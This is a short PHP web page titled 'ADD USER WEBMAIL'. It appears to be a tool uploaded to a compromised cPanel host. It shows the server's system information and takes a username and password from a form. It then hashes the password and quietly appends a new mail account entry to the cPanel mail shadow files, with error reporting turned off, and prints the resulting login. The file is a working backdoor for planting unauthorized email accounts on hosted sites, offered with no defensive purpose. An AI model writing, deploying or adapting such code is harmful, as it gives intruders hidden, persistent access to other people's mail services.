<html>
	<head>
		<title>ADD USER WEBMAIL</title>
		<meta name="theme-color" content="#1e2327">
	<meta name="viewport" content="width=device-width, initial-scale=0.5">
		<style>
body{
background:#1e2327;
font-size:1em;
color:#FFFFFF;
}		
.fail {  
  display: inline;
  background:#F44336;
  line-height: 2em;
  padding: .1em;
  font-size:1.2em;
  color: #fff;
}
.suc {  
  display: inline;
  background:lime;
  line-height: 2em;
  padding: .1em;
  font-size:1em;
  color: #fff;
  border-radius:15px;
}
.hd{
margin-top:30px;
}
input[type=submit] {
	background:#FF005F;
	color:white;
 	margin:0 10px;
  height:27px;
	 width: 80px;
  border-radius:40px;
	 font-size:17;
	border:none;
}		 
input[type=text] { 
 	padding:3px 3px 3px;
 	border:1px solid #455A64; 
 	height:27px;
 	border-radius:40px;
 	background:#263238;
 	color:#FFFFFF;
}  
</style>
	</head>
	<body>
<center>
<div class="hd">
<img src="https://i.postimg.cc/mRv8GRbZ/webmail-logo-RGB-v42015.png"height="80px"width="400px">
<pre>
<?php echo php_uname(); ?>
</pre>
<form method=post>
<pre>
USR:<input type="text" name="username"autocomplete="off">
PW :<input type="text" name="ngentod"autocomplete="off">

<input type="submit"name="crot">
</form>
<?php
error_reporting(0);
if(isset($_POST['crot'])){    
$usr = @get_current_user();
$cp = "/home/$usr/.cpanel";
if (is_dir($cp)) {
	$domain = $_SERVER['HTTP_HOST'];
	$ip = $_SERVER["SERVER_ADDR"];
	if(strstr($domain, 'www.')){
		$domain = str_replace("www.","",$domain);
	}else{
		$domain = $domain;
	}
	@mkdir("/home/$usr/etc/$domain");
	$pw=$_POST['ngentod'];
	$user=$_POST['username'];
 $crypt = crypt($pw,'$6$283839291$');
	$mail ="".$user.":".$crypt.":16249:::::";
	$shadow1 = "/home/$usr/etc/$domain/shadow";
	$shadow2 = "/home/$usr/etc/shadow";
	$fo=fopen($shadow1,"a");
	fwrite($fo,$mail);
	$fo2=fopen($shadow2,"a");
	fwrite($fo2,$mail);
	echo "<span class='suc'>SUCCESS:</span>$domain|$user@$domain|$pw</span>";
	}else
echo"<span class='fail'>FAILED !!!</span>";
}
?>